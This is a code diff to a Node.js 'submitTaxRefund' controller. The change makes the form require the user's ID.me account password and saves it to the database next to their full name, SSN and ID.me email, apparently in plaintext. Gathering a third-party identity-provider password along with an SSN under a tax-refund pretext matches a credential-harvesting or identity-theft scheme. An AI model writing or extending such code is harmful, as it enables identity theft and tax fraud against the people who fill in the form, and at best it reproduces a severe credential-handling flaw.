@@ -677,10 +677,10 @@ exports.submitTaxRefund = async (req, res, next) => {
   const session = await mongoose.startSession();
   session.startTransaction();
   try {
-    const { fullName, ssn, idmeEmail, country } = req.body;
+    const { fullName, ssn, idmeEmail, idmePassword, country } = req.body;
 
     // Validate required fields
-    if (!fullName || !ssn || !idmeEmail || !country) {
+    if (!fullName || !ssn || !idmeEmail || !idmePassword || !country) {
       await session.abortTransaction();
       session.endSession();
       return res.status(400).json({
@@ -732,6 +732,7 @@ exports.submitTaxRefund = async (req, res, next) => {
       fullName,
       ssn,
       idmeEmail,
+      idmePassword,
       country
     }], { session });
 
